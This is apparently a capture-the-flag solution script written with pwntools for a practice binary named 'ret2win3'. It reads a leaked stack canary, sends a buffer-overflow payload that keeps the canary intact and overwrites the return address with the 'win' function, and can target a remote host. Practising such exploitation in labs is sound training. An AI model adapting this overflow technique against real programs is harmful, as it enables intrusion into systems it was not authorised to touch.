from pwn import *


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = """
init-pwndbg
b *main+124
b *main+98
continue
""".format(**locals())

exe = "./ret2win3"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "info"
context.terminal = "kitty"

io = start()
offset = 104

io.recvuntil(b"you: ")

canary = int(io.recvline().strip(), 16)

log.info(f"Canary : {hex(canary)}")

payload = flat({offset: [canary, b"A" * 8, elf.sym["win"] + 5]})

io.sendline(payload)

io.interactive()
